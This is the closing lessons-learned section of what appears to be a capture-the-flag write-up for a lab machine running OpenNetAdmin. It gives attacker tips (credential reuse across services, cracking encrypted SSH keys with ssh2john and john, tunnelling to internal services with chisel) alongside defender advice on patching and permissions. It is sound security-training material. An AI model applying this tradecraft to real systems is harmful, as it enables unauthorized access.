![shellception](shellception.png)



## LESSONS LEARNED

### Attacker

- Take note of **everything that requires a login**: services on the box, pages of a website, databases... everything: write them down. Every time you find a new credential (or just a password), review this list and try logging in to each service again using that credential.
  I don't want to admit how many times I've found a password and neglected to go try that password in SSH.
- If you come across an RSA private key, and it is marked ENCRYPTED, you won't be able to use it right away. **Crack it first** using `ssh2john + john`.
- An SSH connection is always preferable to a reverse shell, even an upgraded one. If it seems like SSH is a possibility, go for it.
- If you check for listening processes using `netstat -tulpn` and find a listening process that is not exposed to the internet (and thus not found by your initial nmap scanning), **don't hesitate to use chisel**: it's much easier than it looks, once you wrap your head around it.

### Defender

- Always keep external-facing services fully updated. None of this would have been possible if it weren't for the initial RCE exploit against the outdated version of OpenNetAdmin.
- Lock down directory permissions and restrict users from accessing anything other than what is necessary. For example, there is no obvious reason for ``joanna`` to be able to `sudo nano /opt/priv` without a password.
- Hiding something as an "internal" service becomes completely meaningless as soon as an external attacker gains a foothold on the system. I get that `internal.openadmin.htb` was a bit contrived, but it is important to remember that nothing is "internal" once an attacker can build a tunnel.



------

Thanks for reading

🤝 🤝 🤝 🤝
@4wayhandshake
